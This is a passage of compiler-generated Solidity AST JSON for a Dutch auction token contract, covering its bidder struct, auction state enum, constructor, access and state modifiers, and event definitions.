me":"uint256","nodeType":"ElementaryTypeName","src":"1159:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1051,"mutability":"mutable","name":"refundEth","nameLocation":"1204:9:7","nodeType":"VariableDeclaration","scope":1054,"src":"1196:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1050,"name":"uint256","nodeType":"ElementaryTypeName","src":"1196:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1053,"mutability":"mutable","name":"isExist","nameLocation":"1228:7:7","nodeType":"VariableDeclaration","scope":1054,"src":"1223:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1052,"name":"bool","nodeType":"ElementaryTypeName","src":"1223:4:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"name":"Bidder","nameLocation":"1000:6:7","nodeType":"StructDefinition","scope":1950,"src":"993:249:7","visibility":"public"},{"canonicalName":"Dutch_Auction.AuctionState","id":1057,"members":[{"id":1055,"name":"OPEN","nameLocation":"1341:4:7","nodeType":"EnumValue","src":"1341:4:7"},{"id":1056,"name":"CLOSING","nameLocation":"1355:7:7","nodeType":"EnumValue","src":"1355:7:7"}],"name":"AuctionState","nameLocation":"1318:12:7","nodeType":"EnumDefinition","src":"1313:55:7"},{"constant":false,"id":1060,"mutability":"mutable","name":"s_auctionState","nameLocation":"1425:14:7","nodeType":"VariableDeclaration","scope":1950,"src":"1404:35:7","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"},"typeName":{"id":1059,"nodeType":"UserDefinedTypeName","pathNode":{"id":1058,"name":"AuctionState","nameLocations":["1404:12:7"],"nodeType":"IdentifierPath","referencedDeclaration":1057,"src":"1404:12:7"},"referencedDeclaration":1057,"src":"1404:12:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"visibility":"private"},{"body":{"id":1099,"nodeType":"Block","src":"1530:327:7","statements":[{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1070,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1068,"name":"_reservePrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1062,"src":"1561:13:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":1069,"name":"_startPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1064,"src":"1577:11:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"1561:27:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"7265736572766520707269636520697320686967686572207468616e2063757272656e74207072696365","id":1071,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"1602:44:7","typeDescriptions":{"typeIdentifier":"t_stringliteral_38757c7dcf65b5437abfa02f01861a03ff1102a815613df32ef87b07e7430473","typeString":"literal_string \"reserve price is higher than current price\""},"value":"reserve price is higher than current price"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_38757c7dcf65b5437abfa02f01861a03ff1102a815613df32ef87b07e7430473","typeString":"literal_string \"reserve price is higher than current price\""}],"id":1067,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"1540:7:7","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":1072,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1540:116:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1073,"nodeType":"ExpressionStatement","src":"1540:116:7"},{"expression":{"id":1077,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1074,"name":"i_owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1017,"src":"1666:7:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"expression":{"id":1075,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"1676:3:7","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":1076,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"1680:6:7","memberName":"sender","nodeType":"MemberAccess","src":"1676:10:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"1666:20:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":1078,"nodeType":"ExpressionStatement","src":"1666:20:7"},{"expression":{"id":1081,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1079,"name":"reservePrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1015,"src":"1696:12:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":1080,"name":"_reservePrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1062,"src":"1711:13:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"1696:28:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1082,"nodeType":"ExpressionStatement","src":"1696:28:7"},{"expression":{"id":1088,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1083,"name":"currentPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1008,"src":"1734:12:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":1086,"name":"_startPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1064,"src":"1756:11:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1085,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"1749:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int256_$","typeString":"type(int256)"},"typeName":{"id":1084,"name":"int256","nodeType":"ElementaryTypeName","src":"1749:6:7","typeDescriptions":{}}},"id":1087,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1749:19:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"1734:34:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"id":1089,"nodeType":"ExpressionStatement","src":"1734:34:7"},{"expression":{"id":1092,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1090,"name":"startPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1013,"src":"1778:10:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":1091,"name":"_startPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1064,"src":"1791:11:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"1778:24:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1093,"nodeType":"ExpressionStatement","src":"1778:24:7"},{"expression":{"id":1097,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1094,"name":"s_auctionState","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1060,"src":"1813:14:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"expression":{"id":1095,"name":"AuctionState","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1057,"src":"1830:12:7","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_AuctionState_$1057_$","typeString":"type(enum Dutch_Auction.AuctionState)"}},"id":1096,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"1843:7:7","memberName":"CLOSING","nodeType":"MemberAccess","referencedDeclaration":1056,"src":"1830:20:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"src":"1813:37:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"id":1098,"nodeType":"ExpressionStatement","src":"1813:37:7"}]},"id":1100,"implemented":true,"kind":"constructor","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":1065,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1062,"mutability":"mutable","name":"_reservePrice","nameLocation":"1486:13:7","nodeType":"VariableDeclaration","scope":1100,"src":"1478:21:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1061,"name":"uint256","nodeType":"ElementaryTypeName","src":"1478:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1064,"mutability":"mutable","name":"_startPrice","nameLocation":"1509:11:7","nodeType":"VariableDeclaration","scope":1100,"src":"1501:19:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1063,"name":"uint256","nodeType":"ElementaryTypeName","src":"1501:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1477:44:7"},"returnParameters":{"id":1066,"nodeType":"ParameterList","parameters":[],"src":"1530:0:7"},"scope":1950,"src":"1466:391:7","stateMutability":"payable","virtual":false,"visibility":"public"},{"body":{"id":1111,"nodeType":"Block","src":"1904:158:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":1105,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"id":1102,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"1959:3:7","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":1103,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"1963:6:7","memberName":"sender","nodeType":"MemberAccess","src":"1959:10:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":1104,"name":"i_owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1017,"src":"1973:7:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"1959:21:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1109,"nodeType":"IfStatement","src":"1955:59:7","trueBody":{"errorCall":{"arguments":[],"expression":{"argumentTypes":[],"id":1106,"name":"Dutch_Auction__NotOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1000,"src":"1989:23:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$__$returns$__$","typeString":"function () pure"}},"id":1107,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1989:25:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1108,"nodeType":"RevertStatement","src":"1982:32:7"}},{"id":1110,"nodeType":"PlaceholderStatement","src":"2024:1:7"}]},"id":1112,"name":"onlyOwner","nameLocation":"1892:9:7","nodeType":"ModifierDefinition","parameters":{"id":1101,"nodeType":"ParameterList","parameters":[],"src":"1901:2:7"},"src":"1883:179:7","virtual":false,"visibility":"internal"},{"body":{"id":1123,"nodeType":"Block","src":"2088:157:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":1117,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"id":1114,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"2143:3:7","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":1115,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"2147:6:7","memberName":"sender","nodeType":"MemberAccess","src":"2143:10:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"id":1116,"name":"i_owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1017,"src":"2157:7:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"2143:21:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1121,"nodeType":"IfStatement","src":"2139:58:7","trueBody":{"errorCall":{"arguments":[],"expression":{"argumentTypes":[],"id":1118,"name":"Dutch_Auction__IsOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1002,"src":"2173:22:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$__$returns$__$","typeString":"function () pure"}},"id":1119,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2173:24:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1120,"nodeType":"RevertStatement","src":"2166:31:7"}},{"id":1122,"nodeType":"PlaceholderStatement","src":"2207:1:7"}]},"id":1124,"name":"notOwner","nameLocation":"2077:8:7","nodeType":"ModifierDefinition","parameters":{"id":1113,"nodeType":"ParameterList","parameters":[],"src":"2085:2:7"},"src":"2068:177:7","virtual":false,"visibility":"internal"},{"body":{"id":1135,"nodeType":"Block","src":"2274:186:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"},"id":1129,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"id":1126,"name":"AuctionState","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1057,"src":"2329:12:7","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_AuctionState_$1057_$","typeString":"type(enum Dutch_Auction.AuctionState)"}},"id":1127,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"2342:7:7","memberName":"CLOSING","nodeType":"MemberAccess","referencedDeclaration":1056,"src":"2329:20:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"id":1128,"name":"s_auctionState","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1060,"src":"2353:14:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"src":"2329:38:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1133,"nodeType":"IfStatement","src":"2325:87:7","trueBody":{"errorCall":{"arguments":[],"expression":{"argumentTypes":[],"id":1130,"name":"Dutch_Auction__NotOpen","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1004,"src":"2388:22:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$__$returns$__$","typeString":"function () pure"}},"id":1131,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2388:24:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1132,"nodeType":"RevertStatement","src":"2381:31:7"}},{"id":1134,"nodeType":"PlaceholderStatement","src":"2422:1:7"}]},"id":1136,"name":"AuctionOpen","nameLocation":"2260:11:7","nodeType":"ModifierDefinition","parameters":{"id":1125,"nodeType":"ParameterList","parameters":[],"src":"2271:2:7"},"src":"2251:209:7","virtual":false,"visibility":"internal"},{"body":{"id":1147,"nodeType":"Block","src":"2491:168:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"},"id":1141,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"id":1138,"name":"AuctionState","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1057,"src":"2546:12:7","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_AuctionState_$1057_$","typeString":"type(enum Dutch_Auction.AuctionState)"}},"id":1139,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"2559:4:7","memberName":"OPEN","nodeType":"MemberAccess","referencedDeclaration":1055,"src":"2546:17:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"id":1140,"name":"s_auctionState","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1060,"src":"2567:14:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"src":"2546:35:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1145,"nodeType":"IfStatement","src":"2542:69:7","trueBody":{"errorCall":{"arguments":[],"expression":{"argumentTypes":[],"id":1142,"name":"Dutch_Auction__Open","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1006,"src":"2590:19:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$__$returns$__$","typeString":"function () pure"}},"id":1143,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2590:21:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1144,"nodeType":"RevertStatement","src":"2583:28:7"}},{"id":1146,"nodeType":"PlaceholderStatement","src":"2621:1:7"}]},"id":1148,"name":"AuctionClosed","nameLocation":"2475:13:7","nodeType":"ModifierDefinition","parameters":{"id":1137,"nodeType":"ParameterList","parameters":[],"src":"2488:2:7"},"src":"2466:193:7","virtual":false,"visibility":"internal"},{"anonymous":false,"documentation":{"id":1149,"nodeType":"StructuredDocumentation","src":"3148:25:7","text":"Events"},"eventSelector":"0f0eb7cc9cde5623ecdc8f18c7fe6bacab47ab80468f73b4d9b3d08ec7284af5","id":1159,"name":"startAuctionEvent","nameLocation":"3184:17:7","nodeType":"EventDefinition","parameters":{"id":1158,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1151,"indexed":false,"mutability":"mutable","name":"startTime","nameLocation":"3219:9:7","nodeType":"VariableDeclaration","scope":1159,"src":"3211:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1150,"name":"uint256","nodeType":"ElementaryTypeName","src":"3211:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1153,"indexed":false,"mutability":"mutable","name":"ERC20Address","nameLocation":"3246:12:7","nodeType":"VariableDeclaration","scope":1159,"src":"3238:20:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1152,"name":"address","nodeType":"ElementaryTypeName","src":"3238:7:7","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1155,"indexed":false,"mutability":"mutable","name":"totalAlgosAvailable","nameLocation":"3276:19:7","nodeType":"VariableDeclaration","scope":1159,"src":"3268:27:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1154,"name":"uint256","nodeType":"ElementaryTypeName","src":"3268:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1157,"indexed":false,"mutability":"mutable","name":"changePerMin","nameLocation":"3313:12:7","nodeType":"VariableDeclaration","scope":1159,"src":"3305:20:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1156,"name":"uint256","nodeType":"ElementaryTypeName","src":"3305:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3201:130:7"},"src":"3178:154:7"},{"anonymous":false,"eventSelector":"6559452b5cf88e12990371c9441273d2dbb464fb7dd9cc4030551b86df924b62","id":1167,"name":"addBidderEvent","nameLocation":"3343:14:7","nodeType":"EventDefinition","parameters":{"id":1166,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1161,"indexed":false,"mutability":"mutable","name":"bidderID","nameLocation":"3375:8:7","nodeType":"VariableDeclaration","scope":1167,"src":"3367:16:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1160,"name":"uint256","nodeType":"ElementaryTypeName","src":"3367:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1163,"indexed":false,"mutability":"mutable","name":"walletAddress","nameLocation":"3401:13:7","nodeType":"VariableDeclaration","scope":1167,"src":"3393:21:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1162,"name":"address","nodeType":"ElementaryTypeName","src":"3393:7:7","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1165,"indexed":false,"mutability":"mutable","name":"bidvalue","nameLocation":"3432:8:7","nodeType":"VariableDeclaration","scope":1167,"src":"3424:16:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1164,"name":"uint256","nodeType":"ElementaryTypeName","src":"3424:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3357:89:7"},"src":"3337:110:7"},{"anonymous":false,"eventSelector":"7cda8554820ef0a356899263aefa9db86ab6966b7b823eda047b78c3afdfeb8e","id":1173,"name":"updateCurrentPriceEvent","nameLocation":"3458:23:7","nodeType":"EventDefinition","parameters":{"id":1172,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1169,"indexed":false,"mutability":"mutable","name":"timeElapsed","nameLocation":"3490:11:7","nodeType":"VariableDeclaration","scope":1173,"src":"3482:19:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1168,"name":"uint256","nodeType":"ElementaryTypeName","src":"3482:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1171,"indexed":false,"mutability":"mutable","name":"currentprice","nameLocation":"3511:12:7","nodeType":"VariableDeclaration","scope":1173,"src":"3503:20:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1170,"name":"uint256","nodeType":"ElementaryTypeName","src":"3503:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3481:43:7"},"src":"3452:73:7"},{"anonymous":false,"eventSelector":"039b13884cbcea684931b2bcff6faab7170693e1bc173e651e14168c890c7080","id":1179,"name":"sendTokenEvent","nameLocation":"3536:14:7","nodeType":"EventDefinition","parameters":{"id":1178,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1175,"indexed":false,"mutability":"mutable","name":"bidderAddress","nameLocation":"3559:13:7","nodeType":"VariableDeclaration","scope":1179,"src":"3551:21:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1174,"name":"address","nodeType":"ElementaryTypeName","src":"3551:7:7","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1177,"indexed":false,"mutability":"mutable","name":"tokensSent","nameLocation":"3582:10:7","nodeType":"VariableDeclaration","scope":1179,"src":"3574:18:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1176,"name":"uint256","nodeType":"ElementaryTypeName","src":"3574:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3550:43:7"},"src":"3530:64:7"},{"anonymous":false,"eventSelector":"fddc7ff43057ddee4a9d547146937f15683eee66fcfefe81ad6488c961868b63","id":1187,"name":"calculateEvent","nameLocation":"3605:14:7","nodeType":"EventDefinition","parameters":{"id":1186,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1181,"indexed":false,"mutability":"mutable","name":"bidderAddress","nameLocation":"3637:13:7","nodeType":"VariableDeclaration","scope":1187,"src":"3629:21:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1180,"name":"address","nodeType":"ElementaryTypeName","src":"3629:7:7","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1183,"indexed":false,"mutability":"mutable","name":"TokensPurchased","nameLocation":"3668:15:7","nodeType":"VariableDeclaration","scope":1187,"src":"3660:23:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1182,"name":"uint256","nodeType":"ElementaryTypeName","src":"3660:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1185,"indexed":false,"mutability":"mutable","name":"refundValue","nameLocation":"3701:11:7","nodeType":"VariableDeclaration","scope":1187,"src":"3693:19:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1184,"name":"uint256","nodeType":"ElementaryTypeName","src":"3693:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3619:99:7"},"src":"3599:120:7"},{"anonymous":false,"eventSelector":"b24b09fd2e8e4d8904c3c26f3e935824e032891520ffda419dec9f086b0e1eea","id":1195,"name":"RefundEvent","nameLocation":"3731:11:7","nodeType":"EventDefinition","parameters":{"id":1194,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1189,"indexed":false,"mutability":"mutable","name":"bidderAddress","nameLocation":"3760:13:7","nodeType":"VariableDeclaration","scope":1195,"src":"3752:21:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1188,"name":"address","nodeType":"ElementaryTypeName","src":"3752:7:7","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1191,"indexed":false,"mutability":"mutable","name":"TokensPurchased","nameLocation":"3791:15:7","nodeType":"VariableDeclaration","scope":1195,"src":"3783:23:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1190,"name":"uint256","nodeType":"ElementaryTypeName","src":"3783:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1193,"indexed":false,"mutability":"mutable","name":"refundValue","nameLocation":"3824:11:7","nodeType":"VariableDeclaration","scope":1195,"src":"3816:19:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1192,"name":"uint256","nodeType":"ElementaryTypeName","src":"3816:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3742:99:7"},"src":"3725:117:7"},{"anonymous":false,"eventSelector":"99d9aed25b1415a4a35a1890d2ee6aa1db28f98ba8eff1de3d494a6af9dca772","id":1203,"name":"endAuctionEvent","nameLocation":"3854:15:7","nodeType":"EventDefinition","parameters":{"id":1202,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1197,"indexed":false,"mutability":"mutable","name":"totalBidders","nameLocation":"3887:12:7","nodeType":"VariableDeclaration","scope":1203,"src":"3879:20:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1196,"name":"uint256","nodeType":"ElementaryTypeName","src":"3879:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1199,"indexed":false,"mutability":"mutable","name":"burntERC20","nameLocation":"3917:10:7","nodeType":"VariableDeclaration","scope":1203,"src":"3909:18:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint25